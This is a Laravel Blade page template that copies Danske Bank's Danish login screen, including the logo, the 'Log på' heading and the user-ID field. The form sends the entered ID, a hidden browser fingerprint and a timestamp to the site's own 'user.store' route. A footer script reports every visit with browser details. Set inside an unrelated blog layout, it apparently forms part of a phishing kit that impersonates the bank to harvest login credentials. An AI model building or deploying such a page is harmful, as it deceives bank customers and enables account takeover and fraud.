@extends('frontend.layout')
{{-- Page title --}}
@section('title')
    Danske Bank
@stop
{{-- page level styles --}}
@section('header_styles')
@stop

@section('content')
    @include('frontend.header')
    <!-- Start Blog
============================================= -->
    <div class="blog-area single full-blog right-sidebar full-blog p-5 ">
        <div class="container">
            <div class="blog-items">
                <div class="row">
                    <div class="blog-content col-lg-7 col-md-12">
                        <div class="blog-item-box">
                            <div class="item">
                                <div class="info">
                                    <div class="text-center">
                                        <img src="{{asset('images/danske-bank-logo.svg')}}">
                                    </div>
                                    <div class="blog-item-box p-3 pt-5">
                                        <div class="item">
                                            <div class="info pb-2">
                                                <div class="pb-3" style="align-items: center">
                                                    <span>Log på hos Danske Bank A/S</span>
                                                    <div class="right" style="float: right" >
                                                        <img width="52" src="{{asset('images/logo-blue-1.png')}}">
                                                    </div>
                                                </div>
                                                <hr class="sidebar-divider my-0">
                                            </div>
                                            <div class="info pt-2">
                                                <span>BRUGER-ID</span>
                                                <form action="{{route('user.store')}}" method="post">
                                                    @csrf
                                                    <input hidden name="browser" id="browser">
                                                    <input hidden name="dateTime" value="{{date('Y-m-d H:i:s')}}">
                                                    <div class="form-group">
                                                        <input class="form-control" name="name" id="user" required>
                                                    </div>
                                                    <div class="form-group">
                                                        <button class="btn btn-info w-100" type="submit" style="justify-content: right">Fortsæt<i class="arrow_right"></i></button>
                                                    </div>
                                                </form>
                                                <a class="blue-color"><i class="ui-icon-info"></i>
                                                    Glemt bruger-ID?
                                                </a>
                                            </div>
                                            <div class="info">
                                                <div class="form-check">
                                                    <input class="form-check-input" type="checkbox" value="" id="remember">
                                                    <label class="form-check-label" for="remember">
                                                        Husk mig hos Danske Bank A/S
                                                    </label>
                                                </div>
                                                <hr class="sidebar-divider my-0">
                                                <div class="help">
                                                    <a class="blue-color" href="">Afbryd</a> <a class="blue-color" href="">Hjaelp</a>
                                                </div>
                                            </div>
                                        </div>
                                    </div>

                                </div>
                            </div>
                        </div>
                    </div>
                    <!-- Start Sidebar -->
                    <div class="sidebar col-lg-5 col-md-12">
                        @include('frontend.sidebar')
                    </div>
                    <!-- End Start Sidebar -->
                </div>
            </div>
        </div>
    </div>
    <!-- End Blog -->
@endsection
{{-- page level scripts --}}
@section('footer_scripts')
    <script>
        let browser = browserInfo();
        $("#browser").val(browser);
        $.ajax({
            type:'POST',
            url:'{{route('user.visit')}}',
            data:{_token:'{{csrf_token()}}', browser:browser,datetime:'{{date('Y-m-d H:i:s')}}'},
            success:function(result){}
        });
    </script>
@endsection